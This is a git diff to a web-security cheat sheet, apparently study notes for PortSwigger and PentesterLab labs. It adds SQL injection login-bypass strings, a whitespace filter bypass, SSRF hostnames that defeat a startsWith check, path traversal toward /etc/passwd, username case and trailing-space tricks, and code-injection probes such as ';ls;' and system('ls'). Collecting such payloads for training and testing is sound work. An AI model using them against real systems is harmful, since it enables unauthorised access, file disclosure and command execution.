@@ -16,6 +16,8 @@ https://portswigger.net/web-security/sql-injection/cheat-sheet
 - `'`
 - `' OR 1=1#`
 - `' OR '1'='1`
+- `" OR "1"="1"-- 123`
+- - `" OR "1"="1" LIMIT 1#`
 
 ### UNION Based
 
@@ -62,7 +64,7 @@ https://portswigger.net/web-security/sql-injection/cheat-sheet
 
 ### Bypass Skill
 
-- white space not allowed => `/**/`, `%20`, `+`
+- white space not allowed => `/**/`, `%20`, `+`, `\t`
 - [`(`, `)`, `=`, `>`, `<`, `.` not allowed](./sql-injection-stationer-success.md)
 
 ## XSS
@@ -157,6 +159,9 @@ https://portswigger.net/web-security/sql-injection/cheat-sheet
   - URL Encode Fragment: `http://localhost%23@vulnerable-website.com`
   - Double URL Encode With username:password: `http://localhost:80%2523@vulnerable-website.com`
 - [SSRF via Open Redirect](../port-swigger/ssrf.md#lab-ssrf-with-filter-bypass-via-open-redirection-vulnerability)
+- Flawed Logic via `String.startsWith`:
+  - `http://vulnerable-website.com.hackingwithpentesterlab.link`
+  - `https://whatever-hostname.hackingwithpentesterlab.link`
 
 ### Tool: URL Encode All Characters
 
@@ -207,6 +212,7 @@ https://portswigger.net/web-security/os-command-injection#useful-commands
 - `/etc/./passwd`
 - `/etc/../etc/passwd`
 - `/etc/../ETC/passwd`
+- `/pentesterlab;pentesterlab`
 - Windows: `non-exist-dir/../../../file.txt`
 
 ## Access control
@@ -245,6 +251,8 @@ https://portswigger.net/web-security/os-command-injection#useful-commands
 - [Brute-Force verification code](../port-swigger/authentication.md#lab-2fa-broken-logic)
 - [Password reset using victim's username](../port-swigger/authentication.md#lab-password-reset-broken-logic)
 - [Password reset poison via `X-Forward-Host`](../port-swigger/authentication.md#lab-password-reset-poisoning-via-middleware)
+- Case insensitive: "admin" vs "Admin"
+- Space allowed: "admin" vs "admin "
 
 <!--
 "port-swigger/oauth",
@@ -265,6 +273,22 @@ https://portswigger.net/web-security/os-command-injection#useful-commands
 "port-swigger/graphql",
 "port-swigger/race-conditions",
 "port-swigger/http-request-smuggling", -->
+
+## Code Injection
+
+### Recon
+
+- inject `'`, `"`, `}`, `;`, `$`, `#`, `;ls;`, `|ls`
+- string concat: `.`, `+`
+- comment out: `#`, `//`, `;//`
+- execute code:
+
+```
+eval('ls')
+exec('ls')
+system('ls')
+`uname`
+```
 
 <!-- ## Essential skills
 
